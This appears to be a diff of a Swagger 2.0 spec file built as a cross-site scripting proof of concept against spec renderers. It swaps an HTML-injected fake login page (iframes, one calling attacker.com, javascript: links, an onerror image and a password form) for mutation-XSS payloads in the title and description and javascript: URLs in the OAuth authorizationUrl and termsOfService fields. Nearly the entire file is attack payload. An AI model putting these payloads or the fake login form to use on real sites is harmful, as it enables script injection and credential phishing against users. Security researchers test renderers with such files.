@@ -1,40 +1,16 @@
 swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
 info:
-  version: 1.0.0
-  title: Fake Login Page
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : hacked</h1>
-        <h1>HTML Injection : hacked</h1>
-        <h1>HTML Injection : hacked</h1>
-        <h1>HTML Injection : hacked</h1>
-        <h1>HTML Injection : hacked</h1>
-<iframe src="http://attacker.com/?url=http://product-images.example.com/products/123"></iframe>
-<iframe src="javascript:alert(1)"></iframe>
-        <img src=x onerror=alert(0)>
-    </div>
-    <div class="form-container">
-    <h1>HTML Injection : Fake Login</h1>
-    <a href=javaSCRIPT&colon;alert(/XSS/)> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ76c8RC-DDeVG7fxBSInMzNNEJOtQafxfZgLkkxRYT85XsR9osvA" heigh="400" width="600"> </a> 
-    <h1>HTML Injection : hacked</h1>
-        <form action="https://example.com/login" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-</div>'
+  version: "0.0.1"
+  title: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">'
+  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">'
+  termsOfService: "javascript:alert(document.domain)"
 paths:
   /:
-    post:
+    get:
       responses:
-        '200':
-          description: Login successful
+        200:
+          description: Echo GET
